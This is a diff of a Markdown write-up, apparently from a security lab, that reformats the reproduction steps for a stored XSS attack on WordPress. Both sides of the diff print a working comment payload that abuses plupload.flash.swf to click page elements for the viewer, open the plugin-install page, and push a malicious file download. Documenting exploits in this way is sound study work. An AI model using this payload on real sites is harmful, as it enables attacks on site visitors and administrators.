@@ -24,23 +24,23 @@ Created virtual environment in Docker.
 		
   - [ ] Steps to recreate: 
   
-			As a logged in user, leaving a reply/comment to a post using the payload:
+			- As a logged in user, leaving a reply/comment to a post using the payload:
 			
 			```
-				<button onclick="fire()">Click</button>
-				<script>
-				function fire() {
-				open('javascript:setTimeout("location=\'http://example.com/wp-includes/js/plupload/plupload.flash.swf?target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click&uid%g=hello&\'", 2000)');
-				setTimeout('location="http://example.com/wp-admin/plugin-install.php?tab=plugin-information&plugin=wp-super-cache&TB_iframe=true&width=600&height=550"')
+			<button onclick="fire()">Click</button>
+			<script>
+			function fire() {
+			open('javascript:setTimeout("location=\'http://example.com/wp-includes/js/plupload/plupload.flash.swf?target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click&uid%g=hello&\'", 2000)');
+			setTimeout('location="http://example.com/wp-admin/plugin-install.php?tab=plugin-information&plugin=wp-super-cache&TB_iframe=true&width=600&height=550"')
 				}
-				</script>	
+			</script>	
 			```
 			
 			
-			After this comment posts sucessfully, any user that comes across the post will see a clickable button for the comment. If that user clicks the button, the XSS attack will execute and attempt to download a malicious payload from the attack. 
+			- After this comment posts sucessfully, any user that comes across the post will see a clickable button for the comment. If that user clicks the button, the XSS attack will execute and attempt to download a malicious payload from the attack. 
 			
 			
-			In the gif walkthrough, my browser extentions sucessfully blocks the attack from downloading the file, but a user without the proper safeguards would be prompted to download a file. 
+			- In the gif walkthrough, my browser extentions sucessfully blocks the attack from downloading the file, but a user without the proper safeguards would be prompted to download a file. 
 			
   - [ ] References:
     - [Link 1: wpscan] (https://wpscan.com/vulnerability/a82a6c6f-1787-4adc-84dd-3151f1edfd06)
